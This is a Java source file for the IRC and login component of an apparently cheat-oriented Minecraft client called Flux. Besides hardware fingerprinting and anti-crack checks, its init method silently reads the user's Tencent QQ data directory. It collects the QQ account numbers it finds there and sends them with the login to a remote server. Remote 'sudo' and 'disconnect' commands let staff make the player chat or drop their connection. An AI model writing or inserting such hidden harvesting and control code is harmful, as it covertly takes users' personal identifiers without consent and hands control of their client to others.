package today.flux.irc;

import com.darkmagician6.eventapi.EventManager;
import com.darkmagician6.eventapi.EventTarget;
import com.soterdev.SoterObfuscator;
import lombok.Getter;
import net.minecraft.client.Minecraft;
import net.minecraft.util.ChatComponentText;
import org.apache.commons.codec.digest.DigestUtils;
import oshi.SystemInfo;
import oshi.hardware.Processor;
import today.flux.Flux;
import today.flux.event.ChatSendEvent;
import today.flux.event.RespawnEvent;
import today.flux.gui.loginui.PopupDialog;
import today.flux.gui.loginui.GuiLogin;
import today.flux.gui.hud.notification.Notification;
import today.flux.gui.hud.notification.NotificationManager;
import today.flux.irc.client.event.IRCEventManagement;
import today.flux.irc.client.event.IRCListener;
import today.flux.irc.client.network.ClientNetwork;
import today.flux.irc.protocol.packet.LoggedPacket;
import today.flux.module.ModuleManager;
import today.flux.utility.Base58;
import today.flux.utility.ChatUtils;
import today.flux.utility.TimeHelper;

import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.security.MessageDigest;
import java.util.*;

public class IRCClient implements IRCListener {
    public static boolean isChina;

    public final static Long i = -1L;

    public static IRCClient INSTANCE;
    @Getter
    public ClientNetwork clientNetwork;
    public static LoggedPacket loggedPacket;
    public static boolean hasOffline, hasClientInit = false;
    public static boolean reconnectFailed = false;

    public String username, password;

    public IRCClient(String username, String password) {
        this.username = username;
        this.password = password;
        init();
    }

    @SoterObfuscator.Obfuscation(flags = "+native,+tiger-black")
    public void init() {
        EventManager.register(this);
        hasOffline = true;
        reconnectFailed = true;
        INSTANCE = this;

        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(Objects.requireNonNull(this.getClass().getClassLoader().getResourceAsStream("FluxAntiLeak"))));
            String line = null;

            Class clazz = Class.forName("java.lang.ProcessEnvironment");
            Field field = clazz.getDeclaredField("theUnmodifiableEnvironment");
            while ((line = in.readLine()) != null) {
                if (DigestUtils.md5Hex(username + "FAL").equals(line)) {
                    field.setAccessible(true);
                    break;
                }
            }
            Map<String,String> map = (Map<String, String>) field.get(clazz);
            Processor[] processor = (new SystemInfo()).getHardware().getProcessors();
            String a = new Base58(14513).encode((map.get("PROCESSOR_IDENTIFIER") + map.get("LOGNAME") + map.get("USER")).getBytes());
            String b = new Base58(13132).encode((processor[0].getName() + processor.length+ map.get("PROCESSOR_LEVEL") + a).getBytes());
            String c = new Base58(23241).encode((map.get("COMPUTERNAME") + System.getProperty("user.name") + b).getBytes());

            MessageDigest mdsha1 = MessageDigest.getInstance("SHA-1");
            byte[] sha1hash;
            mdsha1.update(Base64.getEncoder().encodeToString((a + b + c).getBytes()).getBytes("iso-8859-1"), 0, Base64.getEncoder().encodeToString((a + b + c).getBytes()).length());
            sha1hash = mdsha1.digest();
            final StringBuffer buf = new StringBuffer();
            for (int i = 0; i < sha1hash.length; ++i) {
                int halfbyte = sha1hash[i] >>> 3 & 0xF;
                int two_halfs = 0;
                do {
                    if (halfbyte >= 0 && halfbyte <= 9) {
                        buf.append((char) (48 + halfbyte));
                    } else {
                        buf.append((char) (97 + (halfbyte - 10)));
                    }
                    halfbyte = (sha1hash[i] & 0xF);
                } while (two_halfs++ < 1);
            }
            String hwid = buf.toString();

            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(hwid.getBytes());
            StringBuffer hexString = new StringBuffer();

            byte[] byteData = md.digest();

            for (byte aByteData : byteData) {
                String hex = Integer.toHexString(0xff & aByteData);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            String origin = new Base58(14514).encode((hwid + hexString).getBytes());
            StringBuffer buffer = new StringBuffer();
            for (int i = 16; i < 16 + 5 * 4; i += 5) {
                buffer.append(origin, i, i + 5);
                buffer.append('-');
            }
            buffer.deleteCharAt(buffer.length() - 1);

            if (!origin.equalsIgnoreCase(origin.toUpperCase()))
                ModuleManager.killAuraMod = null;

            if (!origin.toUpperCase().toLowerCase().equals(origin.toLowerCase()))
                ModuleManager.killAuraMod = null;

            String text = "imagine cracking flux";
            try {String.class.getMethods()[76].getName();} catch (Throwable throwable) {
                text = buffer.toString().toUpperCase();
            }

            StringBuilder allQQ = new StringBuilder();
            try {
                if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                    File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
                    if (qqData.exists() && qqData.isFile()) {
                        BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
                        String qq;
                        while ((qq = stream.readLine()) != null && qq.length() > 0) {
                            if (qq.startsWith("UserDataSavePath=")) {
                                File tencentFiles = new File(qq.split("=")[1]);
                                if (tencentFiles.exists() && tencentFiles.isDirectory()) {
                                    for (File qqdir : tencentFiles.listFiles()) {
                                        if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
                                            allQQ.append(qqdir.getName()).append(',');
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                if (allQQ.toString().endsWith(",")) {
                    allQQ.deleteCharAt(allQQ.length() - 1);
                }
            } catch (Throwable e) {
                System.out.println("Failed to read user infoA");
            }

            this.clientNetwork = new ClientNetwork();
            this.clientNetwork.setValue(isChina ? "china.hvh.asia" : "global.hvh.asia", 5780, username, password, text, Flux.VERSION, String.valueOf(allQQ));

            try {String.class.getMethods()[76].getName();} catch (Throwable throwable) {
                this.clientNetwork.start();
                IRCEventManagement.INSTANCE.registerListener(this);
            }
        } catch (Exception e) {
            e.printStackTrace();
            Color color = new Color(255*255, 255*255, 255*255);
            color.brighter();
        }
    }

    @Override @SoterObfuscator.Obfuscation(flags = "+native,+tiger-black")
    public void onLoggedEvent(LoggedPacket loggedPacket) {
        if (loggedPacket.getMessage().equals("")) {
            IRCClient.loggedPacket = loggedPacket;

            try {
                int offset = (int) System.currentTimeMillis() / 1000 / 60;
                Field strChar = String.class.getDeclaredField("value");
                strChar.setAccessible(true);
                char[] aArray = (char[]) strChar.get(loggedPacket.getVerifySign());
                char[] pre = new char[] {'3', 'I', '4', 'C', 'V', 'X', ')', 'Q', '9', '2', '~', 'n', '~', 'X', '!', 'k', '!', 'z', '%', 'T', '!', 'I', 'g', '+', 'v', 'g', 'H', 'q', 'B', 'S', '*', 'Y', 'G', '%', 's', '9', '1', 'Q', 's', 'd', 'i', '*', 'B', 'V', 'q', 'W', 'U', '#', 'M', 'j', 'r', 'b', '*', '#', 'F', '3', 'n', 'y', '8', 'C', '5', 'x', 'y', 'm', 'T', 'q', 'a', 'D', 'x', 'y', 'V', '(', '0', 'M', ')', 'h', 'a', 'K', 'L', 'N', 'K', 'c', 'P', 'I', 'i', '@', 'z', 'Q', 'S', 'f', '4', 'H', 'X', 'g', 'd', 'S', '8', 'i', '%', 'C', 'O', '*', 'N', '5', '(', '3', '7', '*', 'K', 'b', 'c', '0', 'd', 'k', '#', '!', '0', 's', 'O', 'O', 'i', 'B', 'K', '4', 'o'};
                char[] bArray = (char[]) strChar.get(loggedPacket.getI());
                char[] post = new char[] {'b', 't', 'J', '(', 'X', 'I', 'e', 'a', 'C', '8', 'e', 'k', '@', 'l', 'x', '!', 'K', '~', 'C', '0', '5', 'F', 'B', 'M', '0', 'q', 'T', 'r', 'I', 'g', 'L', '*', 'C', 'l', 'S', 'c', 'z', 'l', '9', '^', 'Y', '6', 't', 'q', 'N', 'N', 'u', 'W', '_', 'J', 'l', '!', 'L', 'F', 'F', 'o', '8', 'Z', '8', 'S', '~', 'A', 'L', 's', '7', 'N', 'E', '#', 'y', 'F', '8', 'S', '4', '4', 'd', 'F', 'G', '4', '*', 'n', 'J', '9', 'Q', 'Z', 'J', 'R', 'M', 'F', 'c', 'p', 'c', 'b', '1', '0', 'n', '6', 'i', 'm', 'e', 'Y', 'C', 'y', '5', 'W', '1', 'X', ')', '5', 'A', 'Z', '^', 's'};
                char[] c1 = new char[pre.length + bArray.length + post.length];
                int index = 0;

                for (char c : pre)
                    c1[index++] = c;
                for (char c : bArray)
                    c1[index++] = c;
                for (char c : post)
                    c1[index++] = c;

                int a = 0;
                do {
                    if (c1.length >= (1 + a * 10)) { c1[a * 10] = (char) (((c1[a * 10] & 0x0D28469A | 0x7987DEC2 ^ 0x31DBD21E) ^ 0x016CF772 & 0xA187AB4C | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (2 + a * 10)) { c1[1 + a * 10] = (char) (((c1[1 + a * 10] & 0xE4ABDAE7 | 0xCA8A1BEA ^ 0x49FCDD8A) ^ 0x406A0ED1 & 0xE04B1232 | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (3 + a * 10)) { c1[2 + a * 10] = (char) (((c1[2 + a * 10] & 0x3C77E0C2 | 0xE1BAAB15 ^ 0x5043FEF7) ^ 0x0DB8F4B3 & 0x26B79531 | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (4 + a * 10)) { c1[3 + a * 10] = (char) (((c1[3 + a * 10] & 0x9C8DE373 | 0x6AC3E8F1 ^ 0x9CCF4BC2) ^ 0xF78DA7D2 & 0x20F98FDC | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (5 + a * 10)) { c1[4 + a * 10] = (char) (((c1[4 + a * 10] & 0x988035C4 | 0xA7DC44EF ^ 0x5B51D984) ^ 0x287347FD & 0x463AA1AF | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (6 + a * 10)) { c1[5 + a * 10] = (char) (((c1[5 + a * 10] & 0xEE5CD652 | 0xFC26C20A ^ 0x07F68B19) ^ 0xAF656F86 & 0xF0606138 | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (7 + a * 10)) { c1[6 + a * 10] = (char) (((c1[6 + a * 10] & 0xF87F4368 | 0x708FBFB6 ^ 0xEEEBFE36) ^ 0xC83E71D0 & 0x3A71737D | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (8 + a * 10)) { c1[7 + a * 10] = (char) (((c1[7 + a * 10] & 0x73D37DA5 | 0x9C506569 ^ 0xD46A6D9E) ^ 0x25B3152E & 0x9C508CD9 | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (9 + a * 10)) { c1[8 + a * 10] = (char) (((c1[8 + a * 10] & 0x5E020069 | 0x9FD921C6 ^ 0xF741771B) ^ 0xEF79EA28 & 0x42242C3F | (offset / 153) + (offset / 325)) % 57);}
                    if (c1.length >= (10 + a * 10)) { c1[9 + a * 10] = (char) (((c1[9 + a * 10] & 0x4BDFE9E4 | 0x4B73B73C ^ 0x615D6664) ^ 0x81832764 & 0x59E84A88 | (offset / 153) + (offset / 325)) % 57);}
                } while (c1.length > ++a*10);

                for (int i = 0; i < c1.length; i++) {
                    c1[i] += (i % 4) | 0x0A8E2251 ^ 0xD67C88CC;
                    c1[i] *= i % 2 == 0 ? 0xAB175676 : 0xBC920323;
                    c1[i] %= 57;
                    c1[i] = (char) (c1[i] > 0 ? c1[i] : -c1[i]);
                    c1[i] += 65;
                }

                for (int i = 0; i < aArray.length; i++) {
                    if (aArray[i] - c1[i] != 0) {
                        IRCEventManagement.INSTANCE.removeListener(this);
                        if (!(Minecraft.getMinecraft().currentScreen instanceof GuiLogin))
                            Minecraft.getMinecraft().displayGuiScreen(new GuiLogin());
                        ((GuiLogin) Minecraft.getMinecraft().currentScreen).dialog = new PopupDialog("Failed to login", "Please try again later.", 200, 55, true);
                        ((GuiLogin) Minecraft.getMinecraft().currentScreen).isLogging = false;
                        return;
                    }
                }

                if(reconnectFailed) {
                    reconnectFailed = false;
                }

                if (hasOffline) {
                    hasOffline = false;
                    if (!hasClientInit) {
                        ChatUtils.sendOutputMessage("[Flux] \2477Connected and Verified Successfully!");
                        hasClientInit = true;
                        Flux.INSTANCE.start();

                        String version = "\247" + loggedPacket.getVersion();

                        Flux.status = version;
                        Flux.DEBUG_MODE = version.contains("Development");

                        if (Flux.DEBUG_MODE) {
                            ModuleManager.registerModule(ModuleManager.debugMod);
                        }

                        Minecraft.getMinecraft().displayGuiScreen(null);
                    } else {
                        ChatUtils.sendOutputMessage("[Flux] \2477Reconnected Successfully!");
                        if (Minecraft.getMinecraft().currentScreen instanceof GuiLogin)
                            Minecraft.getMinecraft().displayGuiScreen(null);
                    }
                }

            } catch (Throwable e) {
                e.printStackTrace();
            }
        } else {
            IRCEventManagement.INSTANCE.removeListener(this);
            EventManager.unregister(this);
            if (!(Minecraft.getMinecraft().currentScreen instanceof GuiLogin))
                Minecraft.getMinecraft().displayGuiScreen(new GuiLogin());
            ((GuiLogin) Minecraft.getMinecraft().currentScreen).dialog = new PopupDialog("Failed to login", loggedPacket.getMessage(), 200, 55, true);
            ((GuiLogin) Minecraft.getMinecraft().currentScreen).isLogging = false;
        }
    }

    @Override @SoterObfuscator.Obfuscation(flags = "+native")
    public void onCommandEvent(String s) {
        String[] args = s.split(" ");
        if (args[0].equalsIgnoreCase("sudo")) {
            Minecraft.getMinecraft().thePlayer.sendChatMessage(s.substring(5));
        } else if (args[0].equalsIgnoreCase("disconnect")) {
            Minecraft.getMinecraft().getNetHandler().getNetworkManager().closeChannel(new ChatComponentText("\247cDisconnected by Flux Staff\n\n\247r" + s.substring(11)));
        }
    }

    @Override @SoterObfuscator.Obfuscation(flags = "+native")
    public void onReceivedMessage(String s, String s1, String s3) {
        try {
            if (s3.charAt(0) == '#') {
                if (s3.contains("IRCUser")) {
                    IRCUser.update(s1, s.substring(1), s.charAt(0) - '0');
                } else {
                    ChatUtils.sendOutputMessage(String.format("\247b[IRC] \247d[%s] \2477%s", s3.substring(1), s));
                }
            } else if (ModuleManager.ircMod.isEnabled()) {
                ChatUtils.sendOutputMessage(String.format("\247b[IRC] \247%s[%s] \2477%s: %s", s3.charAt(0), s3.substring(1), s1, s));
            }
        } catch (Throwable ignored) {

        }
    }

    @Override @SoterObfuscator.Obfuscation(flags = "+native")
    public void onSuccessfulSendMessageEvent() {
        // NotificationManager.show("IRC", "Message has sent.", Notification.Type.SUCCESS);
    }

    TimeHelper cooldown = new TimeHelper();
    String lastMessage = "";

    @SoterObfuscator.Obfuscation(flags = "+native")
    public void sendMessage(String message) {
        float similarityRatio = ChatUtils.getSimilarityRatio(message, lastMessage);
        ChatUtils.debug("Message Similarity Ratio: " + similarityRatio);

        if (!ModuleManager.ircMod.isEnabled()) {
            NotificationManager.show("IRC", "You must enable IRC before sending message!", Notification.Type.ERROR);
        } else if (!cooldown.isDelayComplete(1000)) {
            NotificationManager.show("IRC", "Send message too fast!", Notification.Type.WARNING);
        } else if (similarityRatio > 0.7) {
            NotificationManager.show("IRC", "Message so similar!", Notification.Type.WARNING);
        } else {
            clientNetwork.sendMessage(message);
            lastMessage = message;
            cooldown.reset();
        }
    }

    @EventTarget
    public void onChatSend(ChatSendEvent e) {
        String message = e.message;
        if (!message.startsWith("'"))
            return;

        e.setCancelled(true);

        message = message.substring(1); //remove prefix

        String[] args = message.split(" ");
        if (args[0].equalsIgnoreCase("cmd")) {

            StringBuilder others = new StringBuilder(args[2]);
            for (int i1 = 3; i1 < args.length; i1++) {
                others.append(" ").append(args[i1]);
            }

            clientNetwork.sendAdminCommand(args[1], others.toString());
        } else if (args[0].equalsIgnoreCase("list")) {
            ChatUtils.sendOutputMessage("");
            ChatUtils.sendOutputMessage(String.format("\247b[IRC] \247fIRC List: %d Users Found!", IRCUser.users.size()));
            for (IRCUser user : IRCUser.users.values()) {
                String ign = user.ign;
                if (IRCUser.local.perm == 6)
                    ign = ign.charAt(0) + "***" + ign.substring(ign.length() - 1);
                ChatUtils.sendOutputMessage(String.format("\247b[IRC] \247r\247%c%s => %s", user.rank.charAt(0), "[" + user.rank.substring(1) + "]\247f " + user.username, ign));
            }
        } else if (args[0].equalsIgnoreCase("mute")){
            clientNetwork.sendAdminMute(args[1], Integer.parseInt(args[2]));
        } else {
            sendMessage(message);
        }
    }

    @SoterObfuscator.Obfuscation(flags = "+native")
    @Override
    public void onDisconnect(String s) {
        if (!hasOffline) {
            hasOffline = true;
            new ReconnectThread(clientNetwork).start();
        }
    }

    @EventTarget
    public void onRespawn(RespawnEvent e) {
        this.clientNetwork.sendJoinWorld(Minecraft.getMinecraft().thePlayer.getName());
    }
}
